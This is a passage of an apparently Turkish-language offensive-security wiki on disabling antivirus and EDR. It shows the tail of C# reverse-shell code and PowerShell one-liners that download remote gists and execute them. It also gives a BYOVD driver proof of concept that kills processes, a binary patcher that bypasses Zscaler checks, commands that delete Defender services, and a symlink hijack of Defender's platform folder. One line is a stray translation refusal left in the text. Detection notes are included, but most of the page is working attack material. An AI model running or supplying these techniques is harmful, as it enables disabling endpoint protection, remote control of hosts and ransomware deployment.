						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# compiler kullanarak

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Injector oluşturmak için Python kullanımı örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Kendi Güvenlik Açığı Bulunan Sürücünüzü Getirin (BYOVD) – AV/EDR'yi Kernel Alanından Devre Dışı Bırakma

Storm-2603, fidye yazılımını bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol yardımcı programından yararlandı. Araç, **kendi güvenlik açığı bulunan ancak *imzalı* sürücüsünü** beraberinde getiriyor ve bunu, Protected-Process-Light (PPL) AV hizmetlerinin bile engelleyemediği ayrıcalıklı kernel işlemlerini gerçekleştirmek için kötüye kullanıyor.<sup>[[12]](#references)</sup>

Önemli noktalar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olsa da, ikili dosya Antiy Labs’ın “System In-Depth Analysis Toolkit” aracına ait, yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Hizmet kurulumu**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   İlk satır driver'ı **kernel service** olarak kaydeder, ikinci satır ise başlatarak `\\.\ServiceMouse` öğesinin user space'ten erişilebilir olmasını sağlar.
3. **Driver tarafından sunulan IOCTL'ler**
   | IOCTL code | Yetenek                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID'ye göre herhangi bir işlemi sonlandırma (Defender/EDR services'larını durdurmak için kullanılır) |
   | `0x990000D0` | Diskteki herhangi bir dosyayı silme |
   | `0x990001D0` | Driver'ı kaldırma ve service'i silme |

   Minimal C proof-of-concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Neden işe yarar**: BYOVD, user-mode korumalarını tamamen atlar; kernel'de çalışan kod, PPL/PP, ELAM veya diğer sıkılaştırma özelliklerinden bağımsız olarak *korumalı* süreçleri açabilir, sonlandırabilir ya da kernel nesnelerine müdahale edebilir.

Tespit / Azaltma
•  Microsoft’un güvenlik açığı bulunan sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin; böylece Windows `AToolsKrnl64.sys` dosyasının yüklenmesini reddeder.
•  Yeni *kernel* hizmetlerinin oluşturulmasını izleyin ve dünya tarafından yazılabilir bir dizinden yüklenen ya da izin verilenler listesinde bulunmayan bir sürücü olduğunda uyarı verin.
•  Özel aygıt nesnelerine açılan user-mode tanıtıcılarını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izleyin.

### Diskteki İkili Dosyaları Değiştirerek Zscaler Client Connector Duruş Denetimlerini Atlatma

Zscaler’ın **Client Connector** ürünü, cihaz duruşu kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güvenir. İki zayıf tasarım tercihi tam bir atlatmayı mümkün kılar:

1. Duruş değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).
2. Dahili RPC uç noktaları yalnızca bağlanan çalıştırılabilir dosyanın **Zscaler tarafından imzalandığını** doğrular (`WinVerifyTrust` aracılığıyla).<sup>[[11]](#references)</sup>

**Diskteki dört imzalı ikili dosya yamalanarak** her iki mekanizma da etkisiz hâle getirilebilir:

| İkili dosya | Yamalanan özgün mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her denetim uyumlu olur |
| `ZSAService.exe` | `WinVerifyTrust` işlevine dolaylı çağrı | NOP-ed ⇒ imzasız olanlar da dâhil herhangi bir süreç RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirilir |
| `ZSATunnel.exe` | Tünel üzerindeki bütünlük denetimleri | Kısa devre edilir |

Yama aracından kısa bir alıntı:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Orijinal dosyaları değiştirdikten ve hizmet yığınını yeniden başlattıktan sonra:

* **Tüm** duruş denetimleri **yeşil/uyumlu** görünür.
* İmzasız veya değiştirilmiş ikili dosyalar, adlandırılmış kanal RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Ele geçirilmiş ana makine, Zscaler politikalarıyla tanımlanmış iç ağa kısıtlamasız erişim kazanır.

Bu vaka çalışması, yalnızca istemci tarafında alınan güven kararlarının ve basit imza denetimlerinin birkaç baytlık yamayla nasıl aşılabileceğini gösteriyor.

## Microsoft Defender `BTR.sys` güvenilen işlevselliğinin kötüye kullanımı

Defender'ın **Boot-Time Removal** sürücüsü, klasik BYOVD'ye yararlı bir karşı örnektir. `BTR.sys`, bellek bozulması hatası ve IOCTL arayüzü olmayan, Microsoft tarafından imzalanmış meşru bir iyileştirme bileşenidir; yönetici erişimi ve `SeLoadDriverPrivilege` elde ettikten sonra operatör, özel iyileştirme işlemini taklit ederek sürücünün amaçlanan Ring-0 dosya/kayıt defteri işlemlerini gerçekleştirmesini sağlayabilir. Bu, **ilk erişim veya ayrıcalık yükseltme değil, ihlal sonrası AV/EDR etkisizleştirme mekanizmasıdır**. Ayrıca sürücü, dikkat çeken üçüncü taraf bir sürücüyü içe aktarmak yerine hedefin kendi `MpEngine.dll` dosyasındaki `BOOTTIMETOOL` kaynağından çıkarılabilir.<sup>[[36]](#references)</sup>

### One-shot sürücüyü hazırlama

Defender normalde kaynağı rastgele bir `[a-z]{8}.sys` dosyası olarak bırakır ve benzer adla bir kernel service kaydeder. `DriverEntry`, hizmetin `Args` değerini okur, belirtilen NTFS ADS'yi açar, eylem listesinin şifresini çözüp doğrular, geri bildirim yazar ve başarılı çalıştırmanın ardından `0xC0000056` (`STATUS_DELETE_PENDING`) döndürür; böylece sürücü bellekte kalmak yerine kaldırılır. Taklit edilmiş bir hizmetin aşağıdaki karakteristik değerleri vardır.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` stream'i RC4 ile şifrelenmiş tek bir blob içerir. Analiz edilen build'ler sabit, 256 baytlık bir key'i yeniden kullandığından şifreleme bir yetkilendirme sınırı oluşturmaz. Geçerli bir plaintext; 24 baytlık global header (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, header CRC ve payload'dan türetilen bir transaction ID), ardından null ile sonlandırılmış bir UTF-16 feedback path ve istenen sayıda item içerir. Her item, 16 baytlık bir header (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) ve **tam olarak dört NUL baytıyla** biten, action'a özgü verilerden oluşur. Her header/data bölgesi; polinomu `0xEDB88320`, başlangıç durumu `0xFFFFFFFF` olan ve **final XOR uygulamayan** (`~CRC32`) CRC-32 ile bağımsız olarak denetlenir; CRC durumu her bölge için sıfırlanır.<sup>[[36]](#references)[[37]](#references)</sup>

Kabul edilen action ID'leri şu kernel primitive'lerini açığa çıkarır.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item verisi | Sonuç |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | Kilitli dosyalar da dahil olmak üzere bir dosyayı siler |
| 2 | `[UTF-16 path]` | Boş bir dizini kaldırır |
| 3 | `[Flags][source][destination]` | Bir dosyayı saldırganın seçtiği korumalı bir path'e taşır; boş bir destination silme işlemi anlamına gelir |
| 4 | `[Flags][key path]` | Bir registry key'ini yinelemeli olarak siler |
| 5 | `[Flags][key path + "\\" + value]` | Bir registry value'sunu siler |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | Bir registry value'su oluşturur/günceller ve eksik key path'lerini oluşturur |

5 ve 6 numaralı action'larda, kablo üzerindeki key/value ayıracı **art arda gelen iki ters eğik çizgidir**; geleneksel biçimde yazılmış bir path doğru şekilde ayrıştırılmaz. Feedback file çoğunlukla isteği yansıtır, ancak her item'ın ilk dört veri baytı, item'ın sonuç `NTSTATUS` değerine dönüşür. Başında flags alanı olmayan 1 ve 2 numaralı action'larda BTR, bu status'a yer açmak için path'i ayrılmış son dört bayta kaydırır.<sup>[[36]](#references)</sup>

### `BTR_CLI` iş akışı ve erken önyükleme aralığı

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) tüm zinciri uygular: yerel Defender'dan `BTR.sys` dosyasını çıkarır, `<random>.sys:changelist` ve bir feedback stream oluşturur, zincirlenmiş action'ları serileştirir/checksum'larını hesaplar/şifreler, service registry key'ini doğrudan oluşturur ve ardından `-trigger now` için `NtLoadDriver` çağrısı yapar ya da `-trigger boot` için sürücüyü system-start sürücüsü olarak bırakır. Registry'nin doğrudan hazırlanması, normal SCM `CreateServiceW` yolunu atlar ve bu nedenle service-install Event ID 7045 oluşturmaz. Önyükleme tetiklemeli izler daha sonra `BTR_CLI.exe -cleanup <service_name>` ile kaldırılabilir.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` kullanılamaz; çünkü BTR, depolama yığını ve `SystemRoot` bağlantısı hazır olmadan `DriverEntry` içinden dosya G/Ç işlemleri gerçekleştirir. Yüksek öncelikli `Boot Bus Extender` grubuyla birlikte `Start=1` kullanıldığında işlem Phase 1'de yürütülür: NTFS kullanılabilir durumdadır, ancak birçok system-start güvenlik driver'ı ve user-mode EDR hizmeti henüz başlatılmamıştır. `WdFilter` gibi boot-start filtreleri zaten yüklenmiş olabilir; ancak BTR, bir sonraki başlatmadan önce ikili dosyalarını veya hizmet yapılandırmalarını kaldırabilir ve SCM bunları başlatmadan önce hizmet yürütülebilir dosyalarını silebilir. BTR, boot-start değerlendirmesinden sonra çalıştığı ve geçerli bir Microsoft imzası taşıdığı için ELAM bu açığı kapatmaz.<sup>[[36]](#references)</sup>

Birden fazla eylem tek bir işlemde yürütülür. PoC, sabit kodlanmış `\SystemRoot\Temp\BootClean.log` için Action 1'i öne ekler: BTR bu logu oluşturur, ardından kendi silme isteğini işleyip yükünü kaldırmadan önce logu siler. Bu, geride kalan kanıtı azaltırken geri bildirimin `<random>.sys:<random>.dat` içine yerleştirilmesi driver'ın ve her iki stream'in birlikte kaldırılmasına olanak tanır.<sup>[[36]](#references)[[37]](#references)</sup>

### Yüksek sinyalli tespit korelasyonları

Yalnızca imzaya dayalı kurallar ve Microsoft'un savunmasız driver engelleme listesi, BTR'ın amaçlanan işlevlerinin kötüye kullanılmasını önlemez. Meşru Defender kaynaklı işlemleri rastgele bir başlatıcıdan ayırt ederken bu davranışsal korelasyonları tercih edin.<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` oluşturulması, BTR hazırlığı için evrenseldir. Aynı `.sys` dosyasına eklenen `.dat` ADS'si özellikle şüphelidir; çünkü meşru Defender geri bildirimi normalde `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` altında tutar.
- **System 7045 olmadan Sysmon 12/13:** `Args=...:changelist` ve `Group=Boot Bus Extender` içeren `HKLM\SYSTEM\CurrentControlSet\Services\<random>` kayıt defteri anahtarının doğrudan oluşturulmasını, eşleşen bir SCM yükleme olayı bulunmamasıyla ilişkilendirin.
- **Sysmon 6 -> 23:** Defender dışı bilinen bir kaynaktan BTR driver'ının yüklenmesini, ardından özellikle güvenlik ikili dosyalarının `System`/PID 4 tarafından silinmesiyle ilişkilendirin.
- **Sysmon 11 -> 23:** `\SystemRoot\Temp\BootClean.log` dosyasının `System`/PID 4 tarafından hızla oluşturulup silinmesi durumunda uyarı verin.
- `SeLoadDriverPrivilege` atamasını/etkinleştirilmesini kısıtlayın ve denetleyin; `cmd.exe`, PowerShell veya bilinmeyen bir süreç tarafından bir güvenlik aracı driver'ı hazırlandığında, yalnızca Microsoft imzası yeterli güvence sağlamaz.

## LOLBIN'lerle AV/EDR'yi Kurcalamak İçin Protected Process Light (PPL) Kötüye Kullanımı

Protected Process Light (PPL), yalnızca eşit veya daha yüksek koruma düzeyindeki süreçlerin birbirlerine müdahale edebilmesini sağlayan bir imzalayan/düzey hiyerarşisi uygular. Saldırgan açısından, PPL etkin bir ikili dosyayı meşru şekilde başlatıp argümanlarını kontrol edebiliyorsanız, loglama gibi zararsız işlevleri AV/EDR'nin kullandığı korumalı dizinlere yazma işlemi yapabilen, kısıtlı ve PPL destekli bir primitive'e dönüştürebilirsiniz.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Bir sürecin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen tüm DLL'ler), PPL desteği olan bir EKU ile imzalanmış olmalıdır.
- Süreç, şu bayraklarla CreateProcess kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili dosyanın imzalayanıyla eşleşen uyumlu bir koruma düzeyi istenmelidir (ör. kötü amaçlı yazılımlara karşı koruma imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış düzeyler, oluşturma işleminin başarısız olmasına neden olur.

PP/PPL ve LSASS korumasına daha kapsamlı bir giriş için ayrıca bkz.:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher araçları
- Açık kaynaklı yardımcı araç: CreateProcessAsPPL (koruma düzeyini seçer ve argümanları hedef EXE'ye iletir):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Kullanım şekli:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Bu içerik, PPL korumasını kullanarak antivirüs dosyalarını bozma ve açılışını engelleme adımları içerdiğinden çeviremiyorum. Güvenli özet: Metin, Windows’un korumalı süreç özelliklerinden yararlanarak antivirüsün başlangıç davranışını etkileyen bir yöntemi anlatıyor.

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notlar ve kısıtlamalar
- ClipUp'ın yazdığı içeriği konumlandırma dışında kontrol edemezsiniz; bu primitive, hassas içerik enjeksiyonundan ziyade bozulma için uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatmak için yerel admin/SYSTEM yetkisi gerekir.
- Zamanlama kritiktir: hedef açık olmamalıdır; boot sırasında çalıştırma, dosya kilitlerini önler.

Tespit
- Özellikle standart dışı başlatıcılar tarafından başlatıldığında, boot civarında olağandışı argümanlarla `ClipUp.exe` işleminin oluşturulması.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılmış yeni hizmetler ve bu hizmetlerin Defender/AV'den sürekli önce başlatılması. Defender başlatma hatalarından önce hizmet oluşturma/değiştirme işlemlerini araştırın.
- Defender ikili dosyaları/Platform dizinlerinde dosya bütünlüğü izleme; korumalı işlem bayraklarına sahip işlemlerin beklenmeyen dosya oluşturma/değiştirme işlemleri.
- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan işlemleri ve AV dışı ikili dosyaların anormal PPL düzeyi kullanımını inceleyin.

Azaltma
- WDAC/Code Integrity: PPL olarak hangi imzalı ikili dosyaların ve hangi üst süreçler altında çalışabileceğini kısıtlayın; ClipUp'ın meşru bağlamların dışında çağrılmasını engelleyin.
- Hizmet güvenliği: otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlatma hatalarını araştırın.
- Ortamınızla uyumluysa, güvenlik araçlarını barındıran birimlerde 8.3 kısa ad oluşturmayı devre dışı bırakmayı değerlendirin (kapsamlı biçimde test edin).

## Symlink Hijack ile Microsoft Defender Platform Sürüm Klasörüne Müdahale

Windows Defender, çalışacağı platformu şu konumun altındaki alt klasörleri numaralandırarak seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Sürüm dizesi sözlük sıralamasında en yüksek olan alt klasörü seçer (ör. `4.18.25070.5-0`), ardından Defender hizmeti süreçlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin symlink'leri de dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Önkoşullar
- Yerel Administrator (Platform klasörü altında dizin/symlink oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (boot sırasında hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Nasıl çalışır
- Defender kendi klasörlerine yazılmasını engeller, ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan sözlük sıralamasında en yüksek sürümü seçer.

Adım adım (örnek)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın; örneğin `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde kendi klasörünüze işaret eden, daha yüksek sürüm numaralı bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend)'in yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` altındaki yeni process yolunu ve bu konumu gösteren service yapılandırmasını/registry kaydını gözlemlemelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın uygulama dizininden yüklediği DLL’leri, Defender’ın process’lerinde code execution gerçekleştirmek için bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Version-symlink’i kaldırın; böylece bir sonraki başlangıçta yapılandırılmış path çözümlenemez ve Defender başlatılamaz:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına ayrıcalık yükseltme sağlamadığını; yönetici hakları gerektirdiğini unutmayın.

## PIC ile API/IAT Hooking + Call-Stack Spoofing (Crystal Kit tarzı)

Red team'ler, runtime evasion'ı C2 implantından çıkarıp hedef modülün içine taşıyabilir. Bunun için modülün Import Address Table'ını (IAT) hook'lar ve seçili API'leri saldırganın kontrolündeki position-independent code'a (PIC) yönlendirirler. Bu yaklaşım, evasion'ı birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de genişletir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob'u yükleyin (başına ekleyerek veya eşlikçi olarak). PIC kendi kendine yeterli ve position-independent olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR'ü dolaşın ve hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girdilerini ince PIC wrapper'larına yönlendirecek şekilde değiştirin.
- Her PIC wrapper, gerçek API adresine tail-call yapmadan önce evasion işlemlerini yürütür. Tipik evasion işlemleri şunlardır:
  - Çağrı öncesinde belleği mask'leme/mask'ini kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme), ardından çağrı sonrasında eski hâline getirme.
  - Call-stack spoofing: zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için bir arayüz dışa aktarın; böylece bir Aggressor script'i (veya eşdeğeri), Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilir.

Burada IAT hooking kullanmanın nedenleri
- Hook'lanan import'u kullanan her kodda çalışır; araç kodunu değiştirmeyi veya Beacon'ın belirli API'leri proxy'lemesini gerektirmez.
- Post-ex DLL'leri kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalamanıza ve API çağrılarına aynı masking/stack evasion işlemlerini uygulamanıza olanak tanır.
- CreateProcessA/W'yi wrapper'layarak, call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notlar
- Patch'i relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi reflective loader'lar, yüklenen modülün DllMain'i sırasında hooking yapılabileceğini gösterir.
- Wrapper'ları küçük ve PIC-safe tutun; gerçek API'yi patch uygulamadan önce yakaladığınız özgün IAT değerini veya LdrGetProcedureAddress'ı kullanarak çözümleyin.
- PIC için RW → RX geçişleri kullanın ve yazılabilir+çalıştırılabilir sayfalar bırakmayın.

Call-stack spoofing stub
- Draugr tarzı PIC stub'ları sahte bir çağrı zinciri (benign modüllerdeki dönüş adresleri) oluşturup ardından gerçek API'ye geçiş yapar.
- Bu, Beacon/BOF'ların hassas API'lere ulaşırken canonical stack'ler kullandığını varsayan tespitleri aşar.
- API prologue'una ulaşmadan önce beklenen frame'lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook'ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader'ı post-ex DLL'lerin başına ekleyin.
- Hedef API'leri kaydetmek için bir Aggressor script kullanın; böylece Beacon ve BOF'lar kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanır.

Tespit/DFIR hususları
- IAT integrity: image dışı (heap/anon) adreslere çözümlenen girdiler; import pointer'larının periyodik doğrulanması.
- Stack anomalies: yüklü image'lara ait olmayan dönüş adresleri; image dışı PIC'e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: süreç içindeki IAT yazımları, import thunk'larını değiştiren erken DllMain etkinliği, yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hook'lanmışsa, bellek maskeleme olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader'lar (örn. TitanLdr, AceLdr)
- Memory masking hook'ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub'ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

